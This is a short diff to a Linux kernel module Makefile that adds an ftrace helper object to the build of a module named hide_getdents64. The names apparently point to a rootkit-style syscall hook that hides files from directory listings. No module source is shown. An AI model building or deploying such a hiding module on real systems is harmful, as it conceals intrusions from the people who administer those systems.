@@ -1,4 +1,4 @@
-obj-m += hide_getdents64.o
+obj-m += hide_getdents64.o ftrace_helper.o
 
 all:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
